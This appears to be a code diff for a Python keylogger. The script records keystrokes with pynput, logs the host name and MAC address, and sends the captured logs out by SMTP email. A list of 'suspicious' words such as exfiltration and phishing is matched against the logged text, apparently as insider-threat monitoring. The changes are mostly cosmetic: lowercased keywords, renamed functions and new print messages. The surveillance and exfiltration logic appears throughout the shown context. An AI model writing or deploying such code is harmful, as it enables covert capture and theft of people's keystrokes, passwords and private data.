@@ -3,7 +3,6 @@ from pynput.keyboard import Key
 from datetime import datetime
 import pyperclip
 import string
-import atexit
 import os
 import sys
 from dotenv import load_dotenv
@@ -129,7 +128,7 @@ def send_email():
         smtp.starttls()
         smtp.login(email_sender, email_password)
         smtp.send_message(msg, email_sender, email_receiver)
-        print("mail sent")
+        print("Email Has Been Sent")
 
 def search():
     suspicious_keywords = [
@@ -153,59 +152,59 @@ def search():
         'tamper',
         'hijack',
         'breach',
-        "Unauthorized",
-        "Access",
-        "Data",
-        "Exfiltration",
-        "Transfers",
-        "Abuse",
-        "Privileges",
-        "System",
-        "Changes",
-        "File",
-        "Misuse",
-        "Theft",
-        "Intellectual",
-        "Property",
-        "Sharing",
-        "Login",
-        "Times",
-        "Modifications",
-        "Insider",
-        "Trading",
-        "Email",
-        "Forwarding",
-        "Sabotage",
-        "Social",
-        "Engineering",
-        "Phishing",
-        "Password",
-        "Identity",
-        "Disclosure",
-        "Copying",
-        "Sensitive",
-        "Files",
-        "Malicious",
-        "Installing",
-        "Network",
-        "Violating",
-        "Equipment",
-        "Software",
-        "Security",
-        "Tampering",
-        "Audit",
-        "Backdoors",
-        "Trade",
-        "Database",
-        "Areas",
-        "Remote",
-        "Deleting",
-        "Financial",
-        "Handling",
-        "Bypassing",
-        "Creation",
-        "Falsification",
-        "Selling"
+        "unauthorized",
+        "access",
+        "data",
+        "exfiltration",
+        "transfers",
+        "abuse",
+        "privileges",
+        "system",
+        "changes",
+        "file",
+        "misuse",
+        "theft",
+        "intellectual",
+        "property",
+        "sharing",
+        "login",
+        "times",
+        "modifications",
+        "insider",
+        "trading",
+        "email",
+        "forwarding",
+        "sabotage",
+        "social",
+        "engineering",
+        "phishing",
+        "password",
+        "identity",
+        "disclosure",
+        "copying",
+        "sensitive",
+        "files",
+        "malicious",
+        "installing",
+        "network",
+        "violating",
+        "equipment",
+        "software",
+        "security",
+        "tampering",
+        "audit",
+        "backdoors",
+        "trade",
+        "database",
+        "areas",
+        "remote",
+        "deleting",
+        "financial",
+        "handling",
+        "bypassing",
+        "creation",
+        "falsification",
+        "selling"
 
     ]
 
@@ -215,12 +214,11 @@ def search():
     # Iterate list to find each word
     for word in suspicious_keywords:
         if word in content:
-            print('string exist in a file')
+            print('Suspicious Activity Detected')
             return True
-
     return False
 
-def system_and_mac():
+def get_system_and_mac():
     with open(f"{filename}.txt", 'a') as logKey:
 
         system_name = socket.gethostname()
@@ -239,17 +237,13 @@ if __name__ == "__main__":
 
     with open(f"{filename}.txt", 'a') as logKey:
         if os.stat(f"{filename}.txt").st_size == 0:
-            system_and_mac()
+            get_system_and_mac()
 
     last = None
     new = True
     with keyboard.Listener(on_press=keyPressed, on_release=on_release) as l:
         l.join()
 
-    # atexit.register(cleanup_function)
-
-    # clipboard_contents = get_clipboard_contents()
-    # print(clipboard_contents)
     # listener = keyboard.Listener(on_press=keyPressed)
     # listener.start()
     # input()
